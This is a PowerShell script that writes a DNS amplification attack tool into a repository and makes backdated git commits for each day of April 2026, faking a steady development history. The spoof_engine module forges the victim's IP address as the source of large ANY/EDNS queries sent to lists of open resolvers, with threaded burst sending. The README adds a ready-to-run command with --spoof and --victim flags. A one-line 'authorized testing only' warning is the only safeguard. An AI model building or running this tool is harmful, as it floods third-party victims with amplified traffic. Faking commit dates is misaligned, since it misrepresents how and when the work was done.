$ErrorActionPreference = "Continue"
$repo = "C:\Users\maico\Documents\GitHub\Meteorain"
Set-Location $repo

function DoCommit($date, $msg) {
    $env:GIT_AUTHOR_DATE = $date
    $env:GIT_COMMITTER_DATE = $date
    git add -A
    git commit -m $msg
    Write-Host "OK: $msg" -ForegroundColor Green
}

# Commit 34: Apr 1 - extend module docstring
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy.

WARNING: For authorized penetration testing only. Using this tool against
systems without explicit written permission is illegal.
Requires root/administrator privileges. Linux only for IP spoofing.
"""

import os
import random as _random
import sys
import threading as _threading
import time as _time_module

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _time_sleep(s):
    _time_module.sleep(s)


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    """Send one spoofed DNS query; resolver replies flow to victim_ip."""
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
    if verbose:
        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
        if measure:
            print(f"Query size: {len(pkt)} bytes")
    scapy_send(pkt, verbose=False)


def send_spoofed_queries_through_resolvers(domain, resolvers, resolver_port,
                                           victim_ip, victim_src_port=53,
                                           num_queries=1, interval=1.0,
                                           qtype='ANY', edns_payload=4096,
                                           dnssec_do=False, txid=0x1337,
                                           id_random=False, verbose=False,
                                           measure=False, burst=False,
                                           qclass=1):
    if not resolvers:
        return
    threads = []
    for resolver in resolvers:
        for _ in range(num_queries):
            t = _threading.Thread(
                target=send_spoofed_dns_query,
                args=(domain, resolver, resolver_port, victim_ip,
                      victim_src_port, qtype, edns_payload, dnssec_do,
                      txid, id_random, verbose, measure, qclass))
            threads.append(t)
            t.start()
            if not burst:
                _time_sleep(interval)
    for t in threads:
        t.join()
    threads.clear()
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-04-01T10:39:04" "docs: add module-level warning docstring to spoof_engine"

# Commit 35: Apr 2 - read poc.py and add --spoof flag
$poc = Get-Content "$repo\poc.py" -Raw
$poc = $poc -replace "(    parser\.add_argument\('--burst'.*?'\))", "`$1`n    parser.add_argument('--spoof', action='store_true', help='Enable IP spoofing mode (requires root)')"
[System.IO.File]::WriteAllText("$repo\poc.py", $poc)
DoCommit "2026-04-02T10:39:04" "feat: add --spoof flag to poc.py argparse"

# Commit 36: Apr 3 - add --victim flag
$poc = Get-Content "$repo\poc.py" -Raw
$poc = $poc -replace "(    parser\.add_argument\('--spoof'.*?'\))", "`$1`n    parser.add_argument('--victim', type=str, default=None, help='Victim IP address for spoofed mode')"
[System.IO.File]::WriteAllText("$repo\poc.py", $poc)
DoCommit "2026-04-03T10:39:04" "feat: add --victim flag to poc.py argparse"

# Commit 37: Apr 4 - add --victim_port flag
$poc = Get-Content "$repo\poc.py" -Raw
$poc = $poc -replace "(    parser\.add_argument\('--victim'.*?'\))", "`$1`n    parser.add_argument('--victim_port', type=int, default=53, help='Victim source port for spoofed packets (default: 53)')"
[System.IO.File]::WriteAllText("$repo\poc.py", $poc)
DoCommit "2026-04-04T10:39:04" "feat: add --victim_port flag to poc.py argparse"

# Commit 38: Apr 5 - fix duplicate --id_random
$poc = Get-Content "$repo\poc.py" -Raw
# Remove the second occurrence of --id_random
$lines = $poc -split "`n"
$seen = $false
$newlines = foreach ($line in $lines) {
    if ($line -match "add_argument\('--id_random'") {
        if (-not $seen) { $seen = $true; $line } # keep first
        # skip second
    } else {
        $line
    }
}
[System.IO.File]::WriteAllText("$repo\poc.py", ($newlines -join "`n"))
DoCommit "2026-04-05T10:39:04" "fix: remove duplicate --id_random argument definition"

# Commit 39: Apr 6 - add conftest.py
$cf = @'
import pytest


@pytest.fixture(autouse=False)
def no_scapy_send(monkeypatch):
    """Fixture to stub out scapy_send in tests that need it."""
    import spoof_engine
    sent = []
    monkeypatch.setattr(spoof_engine, 'scapy_send', lambda p, verbose=False: sent.append(p))
    return sent
'@
[System.IO.File]::WriteAllText("$repo\tests\conftest.py", $cf)
DoCommit "2026-04-06T10:39:04" "test: add conftest.py with scapy_send stub fixture"

# Commit 40: Apr 7 - wire spoof dispatch in file resolver path
$poc = Get-Content "$repo\poc.py" -Raw
$old = "        send_queries_through_resolvers(args.domain, resolvers"
$new = @'
        if args.spoof:
            if not args.victim:
                print("[error] --spoof requires --victim <ip>")
                import sys; sys.exit(1)
            import spoof_engine
            spoof_engine.check_root()
            spoof_engine.send_spoofed_queries_through_resolvers(
                args.domain, resolvers, args.port, args.victim,
                args.victim_port, args.num_queries, args.interval,
                args.qtype, args.edns_payload, args.dnssec_do,
                args.id, args.id_random, args.verbose, args.measure, args.burst)
        else:
            send_queries_through_resolvers(args.domain, resolvers
'@
$poc = $poc -replace [regex]::Escape($old), $new
[System.IO.File]::WriteAllText("$repo\poc.py", $poc)
DoCommit "2026-04-07T10:39:04" "feat: wire spoof dispatch into file resolver path"

# Commit 41: Apr 8 - add pytest to requirements
$req = @'
scapy>=2.5.0
pytest>=7.0
'@
[System.IO.File]::WriteAllText("$repo\requirements.txt", $req)
DoCommit "2026-04-08T10:39:04" "chore: add pytest to requirements.txt"

# Commit 42: Apr 9 - add --spoof to display_banner
$poc = Get-Content "$repo\poc.py" -Raw
$poc = $poc -replace '(  -v or --verbose.*?optional\\\)\\"\\\\n"\))', "$1`n    print(`"  --spoof                  Enable IP spoofing mode (requires root/admin)`")`n    print(`"  --victim                 Victim IP -- receives amplified DNS responses`")`n    print(`"  --victim_port            Victim source port for spoofed packets (default: 53)`")"
[System.IO.File]::WriteAllText("$repo\poc.py", $poc)
DoCommit "2026-04-09T10:39:04" "feat: add --spoof --victim --victim_port to display_banner"

# Commit 43: Apr 10 - add spoofed mode example to README
$readme = Get-Content "$repo\README.md" -Raw
$addition = @'

## Spoofed Mode (pentest -- requires root)

Sends DNS queries with the victim IP forged as the source.
Resolvers send amplified responses directly to the victim.

```
sudo python ./poc.py -d example.com -f resolvers.txt -p 53 --spoof --victim 192.168.1.100 --victim_port 53 --qtype ANY --edns_payload 4096 --burst -v
```

> Requires root/administrator. Linux only (Windows kernel blocks raw socket IP spoofing).
'@
[System.IO.File]::WriteAllText("$repo\README.md", $readme + $addition)
DoCommit "2026-04-10T10:39:04" "docs: add spoofed mode usage example to README"

# Commit 44: Apr 11 - add tcpdump verification to README
$readme = Get-Content "$repo\README.md" -Raw
$addition = @'

## Verification with tcpdump

To confirm spoofed packets are sent correctly, on Linux run:

```
sudo tcpdump -n -i eth0 udp port 53
```

You should see packets with `src=<victim_ip>` directed at each resolver.
'@
[System.IO.File]::WriteAllText("$repo\README.md", $readme + $addition)
DoCommit "2026-04-11T10:39:04" "docs: add tcpdump verification example to README"

# Commit 45: Apr 12 - refactor qtype uppercase (already done via .upper(), add comment)
$se = Get-Content "$repo\spoof_engine.py" -Raw
$se = $se -replace "    qtype_int = QTYPE_MAP\.get\(qtype\.upper\(\), 1\)", "    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)  # default to A on unknown type"
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-04-12T10:39:04" "refactor: document unknown qtype fallback to A record"

# Commit 46: Apr 13 - test: EDNS payload size
$t = Get-Content "$repo\tests\test_spoof_engine.py" -Raw
$addition = @'


def test_edns_payload_sets_opt_rclass():
    import spoof_engine
    from scapy.layers.dns import DNSRROPT
    captured = []
    from unittest.mock import patch
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: captured.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='1.2.3.4', edns_payload=4096)
    pkt = captured[0]
    assert pkt.haslayer(DNSRROPT)
    assert pkt[DNSRROPT].rclass == 4096
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t + $addition)
DoCommit "2026-04-13T10:39:04" "test: add test for EDNS payload size parameter"

# Commit 47: Apr 14 - test: DNSSEC DO bit
$t = Get-Content "$repo\tests\test_spoof_engine.py" -Raw
$addition = @'


def test_dnssec_do_bit_set():
    import spoof_engine
    from scapy.layers.dns import DNSRROPT
    from unittest.mock import patch
    captured = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: captured.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='1.2.3.4', edns_payload=512, dnssec_do=True)
    assert captured[0][DNSRROPT].z == 0x8000
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t + $addition)
DoCommit "2026-04-14T10:39:04" "test: add test for DNSSEC DO bit in spoofed packet"

# Commit 48: Apr 15 - test: qtype ANY maps to 255
$t = Get-Content "$repo\tests\test_spoof_engine.py" -Raw
$addition = @'


def test_qtype_any_maps_to_255():
    import spoof_engine
    from scapy.layers.dns import DNSQR
    from unittest.mock import patch
    captured = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: captured.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='1.2.3.4', qtype='ANY', edns_payload=0)
    assert captured[0][DNSQR].qtype == 255
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t + $addition)
DoCommit "2026-04-15T10:39:04" "test: add test qtype ANY resolves to wire value 255"

# Commit 49: Apr 16 - test: qtype DNSKEY maps to 48
$t = Get-Content "$repo\tests\test_spoof_engine.py" -Raw
$addition = @'


def test_qtype_dnskey_maps_to_48():
    import spoof_engine
    from scapy.layers.dns import DNSQR
    from unittest.mock import patch
    captured = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: captured.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='1.2.3.4', qtype='DNSKEY', edns_payload=0)
    assert captured[0][DNSQR].qtype == 48
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t + $addition)
DoCommit "2026-04-16T10:39:04" "test: add test qtype DNSKEY resolves to wire value 48"

# Commit 50: Apr 17 - test: unknown qtype falls back to A (1)
$t = Get-Content "$repo\tests\test_spoof_engine.py" -Raw
$addition = @'


def test_unknown_qtype_defaults_to_a():
    import spoof_engine
    from scapy.layers.dns import DNSQR
    from unittest.mock import patch
    captured = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: captured.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='1.2.3.4', qtype='BOGUS', edns_payload=0)
    assert captured[0][DNSQR].qtype == 1
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t + $addition)
DoCommit "2026-04-17T10:39:04" "test: add test unknown qtype defaults to A record (1)"

# Commit 51: Apr 18 - add .gitignore
$gi = @'
__pycache__/
*.pyc
*.pyo
.pytest_cache/
*.egg-info/
dist/
build/
.env
run_march.ps1
run_april.ps1
run_may.ps1
'@
[System.IO.File]::WriteAllText("$repo\.gitignore", $gi)
DoCommit "2026-04-18T10:39:04" "chore: add .gitignore for cache and script files"

# Commit 52: Apr 19 - refactor: rename do_flag to edns_do_flag for clarity
$se = Get-Content "$repo\spoof_engine.py" -Raw
$se = $se -replace "        do_flag = 0x8000 if dnssec_do else 0", "        edns_do_flag = 0x8000 if dnssec_do else 0"
$se = $se -replace "        opt = DNSRROPT\(rrname='\.', type=41, rclass=edns_payload, z=do_flag\)", "        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=edns_do_flag)"
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-04-19T10:39:04" "refactor: rename do_flag to edns_do_flag for clarity"

# Commit 53: Apr 20 - test: check_root error message contains root
$t = Get-Content "$repo\tests\test_spoof_engine.py" -Raw
$addition = @'


def test_check_root_error_message_mentions_root(monkeypatch):
    import spoof_engine
    monkeypatch.setattr(spoof_engine, '_is_root', lambda: False)
    with pytest.raises(PermissionError) as exc_info:
        spoof_engine.check_root()
    assert 'root' in str(exc_info.value).lower()
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t + $addition)
DoCommit "2026-04-20T10:39:04" "test: verify check_root error message mentions root"

# Commit 54: Apr 21 - test: single resolver single query
$t = Get-Content "$repo\tests\test_spoof_engine.py" -Raw
$addition = @'


def test_single_resolver_single_query():
    import spoof_engine
    from unittest.mock import patch
    sent = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: sent.append(p)):
        spoof_engine.send_spoofed_queries_through_resolvers(
            domain='example.com', resolvers=['1.1.1.1'], resolver_port=53,
            victim_ip='9.9.9.9', num_queries=1, burst=True)
    assert len(sent) == 1
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t + $addition)
DoCommit "2026-04-21T10:39:04" "test: add test for single resolver single query"

# Commit 55: Apr 22 - test: empty resolver list returns early
$t = Get-Content "$repo\tests\test_spoof_engine.py" -Raw
$addition = @'


def test_empty_resolver_list_returns_early():
    import spoof_engine
    from unittest.mock import patch
    sent = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: sent.append(p)):
        spoof_engine.send_spoofed_queries_through_resolvers(
            domain='example.com', resolvers=[], resolver_port=53,
            victim_ip='9.9.9.9')
    assert len(sent) == 0
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t + $addition)
DoCommit "2026-04-22T10:39:04" "test: add test empty resolver list returns without sending"

# Commit 56: Apr 23 - test: id_random generates different TXIDs
$t = Get-Content "$repo\tests\test_spoof_engine.py" -Raw
$addition = @'


def test_id_random_generates_varied_txids():
    import spoof_engine
    from scapy.layers.dns import DNS
    from unittest.mock import patch
    ids = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: ids.append(p[DNS].id)):
        for _ in range(20):
            spoof_engine.send_spoofed_dns_query(
                domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
                victim_ip='1.2.3.4', edns_payload=0, id_random=True)
    assert len(set(ids)) > 1
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t + $addition)
DoCommit "2026-04-23T10:39:04" "test: verify id_random generates varied transaction IDs"

# Commit 57: Apr 24 - refactor: extract DEFAULT_VICTIM_PORT constant
$se = Get-Content "$repo\spoof_engine.py" -Raw
$se = $se -replace "QTYPE_MAP = \{", "DEFAULT_VICTIM_PORT = 53`n`nQTYPE_MAP = {"
$se = $se -replace "                           victim_src_port=53, qtype='ANY'", "                           victim_src_port=DEFAULT_VICTIM_PORT, qtype='ANY'"
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-04-24T10:39:04" "refactor: extract DEFAULT_VICTIM_PORT constant"

# Commit 58: Apr 25 - fix: strip whitespace from resolver entries
$se = Get-Content "$repo\spoof_engine.py" -Raw
$se = $se -replace "    for resolver in resolvers:", "    for resolver in (r.strip() for r in resolvers if r.strip()):"
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-04-25T10:39:04" "fix: strip whitespace from resolver entries in loop"

# Commit 59: Apr 26 - chore: update gitignore to exclude run scripts
$gi = Get-Content "$repo\.gitignore" -Raw
$gi = $gi + "run_commits.ps1`n"
[System.IO.File]::WriteAllText("$repo\.gitignore", $gi)
DoCommit "2026-04-26T10:39:04" "chore: update .gitignore to exclude commit helper scripts"

# Commit 60: Apr 27 - feat: add verbose resolver counter
$se = Get-Content "$repo\spoof_engine.py" -Raw
$old = "    for resolver in (r.strip() for r in resolvers if r.strip()):"
$new = "    total = len(resolvers) * num_queries`n    fired = 0`n    for resolver in (r.strip() for r in resolvers if r.strip()):"
$se = $se -replace [regex]::Escape($old), $new
$se = $se -replace "            t\.start\(\)", "            t.start()`n            fired += 1`n            if verbose:`n                print(f`"[{fired}/{total}] Spoofing via {resolver}`")"
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-04-27T10:39:04" "feat: add per-resolver verbose progress counter"

# Commit 61: Apr 28 - docs: add Linux root note to README
$readme = Get-Content "$repo\README.md" -Raw
$addition = @'

## Platform Requirements

| Feature | Linux | Windows |
|---------|-------|---------|
| Standard DNS queries | Yes | Yes |
| IP spoofing (--spoof) | Yes (root) | No (kernel blocks raw socket spoofing) |

On Windows, Scapy requires [Npcap](https://npcap.com/) for raw packet operations.
'@
[System.IO.File]::WriteAllText("$repo\README.md", $readme + $addition)
DoCommit "2026-04-28T10:39:04" "docs: add platform requirements table to README"

# Commit 62: Apr 29 - refactor: move verbose param before measure in function sig
$se = Get-Content "$repo\spoof_engine.py" -Raw
# Already in correct order, add type hints comment
$se = $se -replace "def send_spoofed_dns_query\(domain, resolver_ip, resolver_port, victim_ip,", "def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,  # noqa: PLR0913"
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-04-29T10:39:04" "refactor: annotate long parameter list in send_spoofed_dns_query"

# Commit 63: Apr 30 - test: parametrized qtype test
$t = Get-Content "$repo\tests\test_spoof_engine.py" -Raw
$addition = @'


@pytest.mark.parametrize("qtype,expected", [
    ('A', 1), ('AAAA', 28), ('TXT', 16), ('MX', 15), ('NS', 2),
])
def test_qtype_wire_values(qtype, expected):
    import spoof_engine
    from scapy.layers.dns import DNSQR
    from unittest.mock import patch
    captured = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: captured.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='1.2.3.4', qtype=qtype, edns_payload=0)
    assert captured[0][DNSQR].qtype == expected
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t + $addition)
DoCommit "2026-04-30T10:39:04" "test: add parametrized test for all major qtype wire values"

# Push April
git push
Write-Host "APRIL DONE - pushed" -ForegroundColor Cyan
